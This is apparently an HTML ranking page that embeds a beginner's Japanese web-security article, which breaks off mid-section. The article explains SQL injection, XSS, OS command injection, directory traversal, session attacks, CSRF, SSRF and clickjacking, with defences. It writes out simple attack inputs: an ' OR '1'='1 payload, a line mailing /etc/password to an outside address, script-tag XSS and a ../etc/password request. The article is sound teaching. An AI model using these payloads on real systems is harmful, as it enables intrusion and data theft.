@@ -1,0 +1,1696 @@
+<html>
+	<head><!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110075493-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-110075493-1');
+</script>
+<!-- Google AdSense -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-6168511236629369",
+    enable_page_level_ads: true
+  });
+</script>
+
+		<meta charset="UTF-8" />
+		<title>Qiita Ranking (Tsutou)</title>
+		<link rel="stylesheet" type="text/css" href="../qranking.css">
+	</head>
+	<body>
+<div class="headerContainer">
+<h1>Qiitaいいね数ランキング (Tsutou さんの投稿分)</h1>
+</div><!--class="headerContainer"-->
+<p><a href="#" onclick="javascript:window.history.back(-1);return false;">[戻る]</a></p>
+<p><i><img width="16" height="16" src="../thumb-up-120px.png" /></i>が同じ値の場合は投稿日時の新しいものが上位としています。</p>
+<p><i><img width="16" height="16" src="../thumb-up-120px.png" /></i>がついていない記事は表示していません。</p>
+<table border="1">
+<tr>
+	<td rowspan="3"><center>Tsutouさんの<br />1位</center></td>
+	<td colspan="4">
+		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>172</kbd>
+		<a target="_blank" href="https://qiita.com/Tsutou/items/4fd498f8ab2638bd5650">Webセキュリティ覚書 : &quot;攻撃&quot; 編 [ 初学者向け ]</a>
+	</td>
+</tr>
+<tr>
+	<td style="width:100px;"><center>投稿日時</center></td>
+	<td style="width:200px;"><center>投稿者</center></td>
+	<td style="width:150px;"><center>タグ</center></td>
+	<td style="width:350px;"><center>本文</center></td>
+</tr>
+<tr>
+	<td style="width:100px;">
+		<!--投稿日時--><center>2017-11-21 10:56:00</center>
+	</td>
+	<td style="width:200px;">
+		@Tsutou<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/187392/profile-images/1505559295">
+	</td>
+	<td style="width:150px;">
+		<!--タグ-->
+		<center><b>[PHP]</b> <b>[SQL]</b> <b>[データベース]</b> <b>[初心者]</b> <b>[セキュリティ]</b> </center>
+	</td>
+	<td style="width:350px;">
+		<!--本文-->
+		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
+<h1>
+<span id="webのセキュリティ" class="fragment"></span><a href="#web%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>Webのセキュリティ</h1>
+
+<p>プログラミングスクールからエンジニアデビューしたものですが、セキュリティの重要さと、攻撃された時の恐ろしさに戦々恐々としました。今でもしてます。</p>
+
+<p>たとえ、エンジニアでなくとも、最低限の対策をしないとリリースするのは危険です。</p>
+
+<p>プログラミングスクールではセキュリティについては、深く学ぶことはあまりないと思います。<br>
+自分と同じ駆け出しエンジニアさんや、エンジニアじゃないけど、Webサービスリリースしたい！みたいな方に共有できたらと思います。<br>
+セミナーでセキュリティについて学んできたので、復習も兼ねて自分なりの解釈で記事に落とそうと思います。</p>
+
+<h1>
+<span id="脆弱性" class="fragment"></span><a href="#%E8%84%86%E5%BC%B1%E6%80%A7"><i class="fa fa-link"></i></a><strong>脆弱性?</strong>
+</h1>
+
+<p>Webサイトの脆弱性は二種類。</p>
+
+<h2>
+<span id="ロジックエラー設計段階で生まれる脆弱性" class="fragment"></span><a href="#%E3%83%AD%E3%82%B8%E3%83%83%E3%82%AF%E3%82%A8%E3%83%A9%E3%83%BC%E8%A8%AD%E8%A8%88%E6%AE%B5%E9%9A%8E%E3%81%A7%E7%94%9F%E3%81%BE%E3%82%8C%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7"><i class="fa fa-link"></i></a>ロジックエラー(設計段階で生まれる脆弱性)</h2>
+
+<p>セッションの管理不備や特殊文字を処理せずにデータを受け渡してしまうことです。</p>
+
+<h2>
+<span id="テクニカルエラー実装段階で生まれる脆弱性" class="fragment"></span><a href="#%E3%83%86%E3%82%AF%E3%83%8B%E3%82%AB%E3%83%AB%E3%82%A8%E3%83%A9%E3%83%BC%E5%AE%9F%E8%A3%85%E6%AE%B5%E9%9A%8E%E3%81%A7%E7%94%9F%E3%81%BE%E3%82%8C%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7"><i class="fa fa-link"></i></a>テクニカルエラー(実装段階で生まれる脆弱性)</h2>
+
+<p>SQLインジェクション、XSS(クロスサイトスクリプティング)などの対策の不足</p>
+
+<h2>
+<span id="sqlインジェクション" class="fragment"></span><a href="#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><strong><font color="red">SQLインジェクション</font></strong>
+</h2>
+
+<h2>
+<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>データベースを操作するSQL文をフォームなどを通して送信し、アプリ側で任意のSQL文を実行させることを言います。<br>
+入社試験でこの語句を解説しろという問題も出ました。それくらい対策必須かつ、被害の多い攻撃です。</p>
+
+<p>ニュースを賑わす、企業の情報流出は巧妙なこのSQLインジェクションによるものが圧倒的に多いそうです。</p>
+
+<p><a href="https://www.scutum.jp/information/web_security_primer/sql_injection.html" rel="nofollow noopener" target="_blank">SQL インジェクションとは？- サイト運営者のためのWebサイトセキュリティ対策入門</a></p>
+
+<h2>
+<span id="例" class="fragment"></span><a href="#%E4%BE%8B"><i class="fa fa-link"></i></a>例</h2>
+
+<p>簡易的に下記のようなSQL用いて、ユーザーIDとパスワードだけで認証をするシステムがあったとします。(今時暗号化されていないpasswordはありえませんが)</p>
+
+<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'$user_id'</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">'$password'</span>
+</pre></div></div>
+
+<p>↓<br>
+犯罪者は変数<strong>$password</strong>に<code>' OR '1' = '1</code>と入るようにユーザー登録をします。<br>
+↓<br>
+すると、</p>
+
+<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'$user_id'</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="s1">'1'</span> <span class="o">=</span> <span class="s1">'1'</span>
+</pre></div></div>
+
+<p>というpasswordがあってなくても、この世で<strong>1が1</strong>ならば全件取得するという無茶苦茶な条件式が出来上がります。</p>
+
+<p>ダダ漏れですね。</p>
+
+<h2>
+<span id="対策" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>代表的なものでは、プログラム側で<strong>静的プレースホルダ</strong>を実装することが有効とされています。</p>
+
+<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span> <span class="o">?</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span> <span class="o">?</span>  
+</pre></div></div>
+
+<p>プレースホルダは?の中に変数の値を埋め込んでくれます。(バインディング)</p>
+
+<p><a href="http://php.net/manual/ja/class.pdostatement.php" rel="nofollow noopener" target="_blank">PDOStatement</a>でDB接続したと仮定して変数データを?に以下のようにバインディングします。</p>
+
+<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id= ? and password= ? "</span><span class="p">;</span>
+
+<span class="c1">//プリペアードステートメント-&gt;実行したいSQLをコンパイルした一種のテンプレート</span>
+<span class="nv">$sth</span> <span class="o">=</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+
+<span class="c1">//1つ目の?にバインド</span>
+<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$user_id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
+
+<span class="c1">//2つ目の?にバインド</span>
+<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
+
+<span class="c1">//PDPStatement::excecute-&gt; プリペアドステートメントを実行する</span>
+<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</pre></div></div>
+
+<p><a href="http://php.net/manual/ja/pdostatement.bindparam.php" rel="nofollow noopener" target="_blank">PDOStatement::bindParam</a><br>
+<a href="http://php.net/manual/ja/pdo.prepared-statements.php" rel="nofollow noopener" target="_blank">プリペアドステートメントおよびストアドプロシージャ</a></p>
+
+<h2>
+<span id="osコマンドインジェクション" class="fragment"></span><a href="#os%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><strong><font color="red">OSコマンドインジェクション</font></strong>
+</h2>
+
+<h2>
+<span id="概要-1" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-1"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>SQL文ではなく、OSコマンドを送り込んでダイレクトに操作してしまう攻撃です。<br>
+Webサイトの挙動から、PHPでいう<a href="http://php.net/manual/ja/function.exec.php" rel="nofollow noopener" target="_blank">exec関数</a>などの外部のプログラムをコマンドにより呼び出す関数を推測され、システムを操作されます。<br>
+メール送信機能はOSコマンドを使用しやすいので、そこに乗せて攻撃されることが多いようです。</p>
+
+<h2>
+<span id="例-1" class="fragment"></span><a href="#%E4%BE%8B-1"><i class="fa fa-link"></i></a>例</h2>
+
+<p><a href="https://camo.qiitausercontent.com/4e14bed0e95a40c379e248978ae6b79beac7c051/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f65623936663534662d316665332d623264382d336235652d3163316363393861366131632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4e14bed0e95a40c379e248978ae6b79beac7c051/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f65623936663534662d316665332d623264382d336235652d3163316363393861366131632e6a706567" alt="お問い合わせ.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/187392/eb96f54f-1fe3-b2d8-3b5e-1c1cc98a6a1c.jpeg"></a></p>
+
+<p>こういうwebアプリケーションのお問い合わせフォームは、メールを自動送信するときに<strong>mailコマンド</strong>や<strong>sendmailコマンド</strong>を使用しています。<br>
+↓<br>
+犯罪者がどこかの箇所に、<br>
+<code>；cat /etc/password | mail hacker_no@gmail.com</code><br>
+とでも打てばコマンド呼び出し関数は；(セミコロン)の後も読み込み、passwordファイルやら重要なファイルをダウンロードし犯罪者に送信します。</p>
+
+<h2>
+<span id="対策-1" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-1"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>対策としては前提として、OSコマンドを呼び出す関数はできるだけ使わないこと。<br>
+もし、呼び出すなら必ず特殊文字をエスケープすること。</p>
+
+<p><a href="https://blog.ohgaki.net/os-command-escape" rel="nofollow noopener" target="_blank">OSコマンドのエスケープ</a></p>
+
+<h2>
+<span id="xssクロスサイトスクリプティング" class="fragment"></span><a href="#xss%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><strong><font color="red">XSS(クロスサイトスクリプティング)</font></strong>
+</h2>
+
+<h2>
+<span id="概要-2" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-2"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>ブラウザ上で不正なスクリプト(一般的にはJavaScript)を動作させる攻撃。<br>
+GETまたはPOSTでWebサイトにスクリプトを送信し、そのまま表示しようとすれば、そのままUIとして動作します。<br>
+入力文字列が遷移先で表示されるアルゴリズムには、XSS脆弱性が潜んでいる可能性があります。<br>
+JavaScriptでできるすべてのことがリスクになりえます。</p>
+
+<h2>
+<span id="例-2" class="fragment"></span><a href="#%E4%BE%8B-2"><i class="fa fa-link"></i></a>例</h2>
+
+<p>極端に簡単な例ですが...</p>
+
+<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span> <span class="s">'nickname'</span> <span class="p">&gt;</span>
+</pre></div></div>
+
+<p>がPOSTで飛んできたものを</p>
+
+<p>次ページで</p>
+
+<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
+</pre></div></div>
+
+<p>と表示するプログラムがあるとすると。<br>
+↓</p>
+
+<p>犯罪者が</p>
+
+<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">”text/javascript”</span><span class="p">&gt;</span>
+　<span class="nx">alert</span><span class="p">(</span><span class="s2">"お前はアホなのか？"</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div></div>
+
+<p>とフォーム送信すればHTMLにスクリプトタグで埋め込まれて表示されるので、Web上に暴言をアラート表示します。<br>
+他にもURLを踏ませたり、偽ページに遷移したり、後述するcookie取得によるセッションハイジャックなど、様々な攻撃法を持っています。</p>
+
+<p>JavaScriptでできるすべてのことがリスクになりえます。(二回目)</p>
+
+<h2>
+<span id="対策-2" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-2"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>代表的なのは、文字列出力の際の特殊文字エンコードです。特殊文字を以下のように置き換えます。</p>
+
+<div class="code-frame" data-lang="erb"><div class="highlight"><pre><span></span><span class="x">&amp; =&gt; &amp;amp;</span>
+<span class="x">&lt; =&gt; &amp;lt;</span>
+<span class="x">&gt; =&gt; &amp;gt;</span>
+<span class="x">" =&gt; &amp;quot;</span>
+<span class="x">' =&gt; &amp;#39;</span>
+</pre></div></div>
+
+<p>ただ、PHPは<a href="https://www.weblio.jp/content/htmlspecialchars" rel="nofollow noopener" target="_blank">htmlspecialchars関数</a>を使用すると自動的にエンコードしてくれます。</p>
+
+<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">escape</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div></div>
+
+<p><strong>反射型</strong>、<strong>蓄積型</strong>、<strong>DOM Based XSS</strong>というタイプ分けもあり、もっと深く知りたい方は、以下の記事参考になります。<br>
+<a href="http://xss.hatenablog.jp/entry/2014/12/03/154132" rel="nofollow noopener" target="_blank">結局XSSって何なの？</a></p>
+
+<h2>
+<span id="xstクロスサイトトレーシング" class="fragment"></span><a href="#xst%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><strong><font color="red">XST(クロスサイトトレーシング)</font></strong>
+</h2>
+
+<h2>
+<span id="概要-3" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-3"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>これは結論から言うと、XSSを利用し<a href="https://www.ginnokagi.com/2012/05/http-trace.html" rel="nofollow noopener" target="_blank">TRACEメソッド</a>を発行させる攻撃ですが、ブラウザの進化により、<strong><em>もう出来ないそうです</em></strong>。<br>
+ただ、未だに<del>ギャーギャー</del>指摘してくる人間は一定数いるので、対策しておくに越したことはないそうです。</p>
+
+<p><a href="https://blog.tokumaru.org/2013/01/TRACE-method-is-not-so-dangerous-in-fact.html" rel="nofollow noopener" target="_blank">実はそんなに怖くないTRACEメソッド</a></p>
+
+<h2>
+<span id="対策-3" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-3"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>対策は簡単で、上述のエンコードをした上で、WebサーバーのTRACEメソッド設定を無効にすればいいようです。<br>
+<a href="http://itochif.com/contents/Security/Apache/apache_003000.html" rel="nofollow noopener" target="_blank">[Apache] TRACEメソッドを無効にする - itochif.com</a></p>
+
+<h2>
+<span id="セッションハイジャック" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%8F%E3%82%A4%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a><strong><font color="red">セッションハイジャック</font></strong>
+</h2>
+
+<h2>
+<span id="概要-4" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-4"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>セッションは銀行や携帯ショップの番号札のようなものです。<br>
+そのセッション管理のロジックの脆弱性をつき、推測可能性が高ければ、そのまま使用したり、総当たりでセッションを自動生成してアクセスし、成功するまで繰り返します。<br>
+そして、セッションIDを使用しているユーザーになりすまし、悪事を働きます。</p>
+
+<h2>
+<span id="例-3" class="fragment"></span><a href="#%E4%BE%8B-3"><i class="fa fa-link"></i></a>例</h2>
+
+<p>何度かアクセスし、セッションIDをログする。(こんな簡単なのは流石にないですが、パターンを読み解くと言う意味で。)</p>
+
+<div class="code-frame" data-lang="numpy"><div class="highlight"><pre><span></span><span class="mi">106662</span>
+<span class="mi">106664</span>
+<span class="mi">106666</span>
+<span class="mi">106668</span>
+<span class="mi">106669</span>
+<span class="mi">106675</span>
+</pre></div></div>
+
+<p>こうなると、前半の1066は固定で、下２桁はカウントアップだと言うことが一目瞭然です。あとは、下２桁を総当たりでアクセスし続け、他人のセッションIDを使って成り済ますことができます。</p>
+
+<h2>
+<span id="対策-4" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-4"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>前提の対策として、セッションIDを簡単に予測出来るものにしないことです。<br>
+リクエストごとにセッションIDを変えたり、有効期限を設定したり、<a href="https://www.symantec.com/ja/jp/page.jsp?id=ssl-tls" rel="nofollow noopener" target="_blank">HTTPS(暗号化SSL/TLS通信)</a>を使用するなどして、推測しづらく、可変性の高いものを目指しましょう。</p>
+
+<h2>
+<span id="セッション固定攻撃" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E5%9B%BA%E5%AE%9A%E6%94%BB%E6%92%83"><i class="fa fa-link"></i></a><strong><font color="red">セッション固定攻撃</font></strong>
+</h2>
+
+<h2>
+<span id="概要-5" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-5"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>前述のセッションハイジャックの逆で、罠を仕掛けて、攻撃者が指定したセッションIDをユーザーに知らず知らずに使わせる方法です。XSSのように罠ありきの受動的な攻撃です。</p>
+
+<h2>
+<span id="例-4" class="fragment"></span><a href="#%E4%BE%8B-4"><i class="fa fa-link"></i></a>例</h2>
+
+<p>犯罪者はセッションidを含んだURLを<strong>メール</strong>なり<strong>XSS</strong>なりでユーザーに踏ませます。<br>
+↓<br>
+<code>htttp://www.hanzai.com/login.cgi?sesid=893893</code><br>
+↓<br>
+こうして、犯罪者側のログインセッションに無意識のうちに有効にしてしまいます。入られてしまえば、あとはやりたい放題です。</p>
+
+<h2>
+<span id="対策-5" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-5"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>対策としては、セッションハイジャックと似ており、やはりセッションIDを認証ごとに変えたり、認証を行わない場所ではセッションIDを使わないといった対策が考えられます。</p>
+
+<h2>
+<span id="httpヘッダインジェクションメールサーバーインジェクション" class="fragment"></span><a href="#http%E3%83%98%E3%83%83%E3%83%80%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><strong><font color="red">Httpヘッダインジェクション、メールサーバーインジェクション</font></strong>
+</h2>
+
+<h2>
+<span id="概要-6" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-6"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>文字通り、　HTTPレスポンスに任意のヘッダやボディを追加する攻撃です。メールサーバーインジェクションは、同じようにメールヘッダに、任意のヘッダや本文を追加する攻撃です。</p>
+
+<h2>
+<span id="例-5" class="fragment"></span><a href="#%E4%BE%8B-5"><i class="fa fa-link"></i></a>例</h2>
+
+<p>HTTPヘッダは改行で区切りを判断しております。<br>
+以下、%0dは改行コードです。</p>
+
+<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>http://hanzai.com?location=%0d%0d<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">”text/javascript”</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="err">“</span><span class="nx">アホなの</span><span class="err">？”</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div></div>
+
+<p>単純に言えば、本来の動きとは違うこういった、任意のヘッダを入れて改竄してしまうのですね。</p>
+
+<p>レスポンスヘッダやボディを改竄するというのは、UIが改ざんされるという事ですから、ユーザーのクッキー（cookie）情報を抜き取るスクリプトなんてこともできるようです（javascriptを埋め込むことができるということです。)</p>
+
+<h2>
+<span id="対策-6" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-6"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>Webサーバや言語のライブラリ、APIをなるべく使いましょう。<br>
+あらかじめ用意されたものなので、余分な改行コードによって改変される可能性が少ないです。<br>
+また、アプリ側のバリデーションを徹底しましょう。</p>
+
+<h2>
+<span id="ディレクトリトラバーサルdirectory-traversal" class="fragment"></span><a href="#%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%83%88%E3%83%A9%E3%83%90%E3%83%BC%E3%82%B5%E3%83%ABdirectory-traversal"><i class="fa fa-link"></i></a><strong><font color="red">ディレクトリトラバーサル(Directory Traversal)</font></strong>
+</h2>
+
+<h2>
+<span id="概要-7" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-7"><i class="fa fa-link"></i></a>概要</h2>
+
+<p><strong><code>../../XXX</code></strong>などの相対パスを使ったリクエストを送り、ディレクトリ移動しアプリ内の非公開ディレクトリや他のファイルに横断的にアクセスされ、重要な情報を盗む攻撃です。</p>
+
+<p>現在、なかなかホットな攻撃手法のようです。</p>
+
+<h2>
+<span id="例-6" class="fragment"></span><a href="#%E4%BE%8B-6"><i class="fa fa-link"></i></a>例</h2>
+
+<p><code>http://hanzai.com/file.php?fn=hanzai.pdf</code><br>
+上記のリクエストで指定されるべき、pdfファイルダウンロードの<code>file.php</code>というphpスクリプトがあったとします。<br>
+↓<br>
+<code>http://hanzai.com/file.php?fn=../etc/password</code>と犯罪者はリクエストを改変して送ってきます。</p>
+
+<p>もし脆弱性があれば、簡単にファイルを盗まれてしまいます。</p>
+
+<h2>
+<span id="対策-7" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-7"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>想定される文字列のみ受け付けるバリデーションをしましょう。<br>
+..(%2e%2e) /(%2e) ¥(%5c)といったディレクトリ移動に繋がる文字、HTMLエンコードはできるだけ弾きましょう。<br>
+また、秘密ファイルへのアクセス権は厳重にしましょう。</p>
+
+<h2>
+<span id="csrfクロスサイトリクエストフォージェリ" class="fragment"></span><a href="#csrf%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA"><i class="fa fa-link"></i></a><strong><font color="red">CSRF(クロスサイトリクエストフォージェリ)</font></strong>
+</h2>
+
+<h2>
+<span id="概要-8" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-8"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>正規ユーザの権限を利用し、特定の処理を促します。XSSのような受動的な攻撃で、Railsの<code>protect from forgery</code>やlaravelの<code>{{ csrf_field() }}</code>など、フレームワークではデフォルトで対策のための関数を多く見かけます。</p>
+
+<h2>
+<span id="例-7" class="fragment"></span><a href="#%E4%BE%8B-7"><i class="fa fa-link"></i></a>例</h2>
+
+<p>特定の商品を購入させたり、メール強制送信、登録情報変更と、ユーザー権限を利用できるものすべてが可能な攻撃方法です。</p>
+
+<h2>
+<span id="対策-8" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-8"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>重要な処理の前では再認証を行ったり、ダブル認証など、認証機能にはなるべく気を払いましょう。CSRF Token設置が代表的な対策でしょうか。</p>
+
+<h2>
+<span id="ssrfサーバーサイドリクエストフォージェリ" class="fragment"></span><a href="#ssrf%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%B5%E3%82%A4%E3%83%89%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA"><i class="fa fa-link"></i></a><strong><font color="red">SSRF(サーバーサイドリクエストフォージェリ)</font></strong>
+</h2>
+
+<h2>
+<span id="概要-9" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-9"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>Webサーバーがユーザーから送られてきた検証されていないパラメーターへの要求を実行するときに発生します。<br>
+正規ユーザの権限を利用しリクエストを偽造するのがCSRFです。権限を利用した偽造攻撃という点で、CSRFの類似攻撃です。CSRFはリクエストに乗せて攻撃を行なっていたのに対し、SSRFはサーバーの権限を不正利用し、コマンドを実行します。</p>
+
+<p><a href="https://blog.ohgaki.net/request-forgery-ssrf-and-csrf" rel="nofollow noopener" target="_blank">リクエストフォージェリ – SSRFとCSRF</a></p>
+
+<blockquote>
+<p>SSRF　サーバーが持つ権限・認証を利用して不正な命令を実行<br>
+CSRF　クライアントが持つ権限・認証を利用して不正な命令を実行</p>
+</blockquote>
+
+<p>上記記事を参考にすると、<strong><em>クライアントサイド</em></strong>で起こるリクエスト偽造攻撃が<strong><em>CSRF</em></strong>、<strong><em>サーバーサイド</em></strong>で起こるリクエスト偽造攻撃が<strong><em>SSRF</em></strong>ということがわかり、リクエストフォージェリが何なのか腹落ちします。</p>
+
+<blockquote>
+<p>@shiracamus さんより<br>
+<a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery" rel="nofollow noopener" target="_blank">Server Side Request Forgery</a></p>
+</blockquote>
+
+<h2>
+<span id="対策-9" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-9"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>リクエストのパラメータが予定しているパラメータなのか、バリデーションの徹底。</p>
+
+<h2>
+<span id="クリックジャッキング" class="fragment"></span><a href="#%E3%82%AF%E3%83%AA%E3%83%83%E3%82%AF%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><strong><font color="red">クリックジャッキング</font></strong>
+</h2>
+
+<h2>
+<span id="概要-10" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-10"><i class="fa fa-link"></i></a>概要</h2>
+
+<p>ログイン認証後画面にiframe要素、スタイルシートなどを駆使して罠を設置し、ユーザーの意図している動きに見せかけて、全く違う操作を行わせます。</p>
+
+<p>比較的新しい攻撃のようです。</p>
+
+<p><a href="https://nulab-inc.com/ja/blog/typetalk/measure-clickjacking/" rel="nofollow noopener" target="_blank">Webエンジニアだったら当然知っておきたい「 クリックジャッキング対策 」とは？</a></p>
+
+<h2>
+<span id="例-8" class="fragment"></span><a href="#%E4%BE%8B-8"><i class="fa fa-link"></i></a>例</h2>
+
+<p>表示されたボタンをクリックするだけで操作が完了する画面があったとします。<br>
+↓<br>
+犯罪者はCSSのopacityなどを使い、攻撃対象画面を透明にしユーザーが操作していると思っている画面に、まるでビニールシートのような罠を設置します。<br>
+↓<br>
+ユーザーは自分が押していると思っていないボタンを押します。攻撃されたことにも気づきません。</p>
+
+<h2>
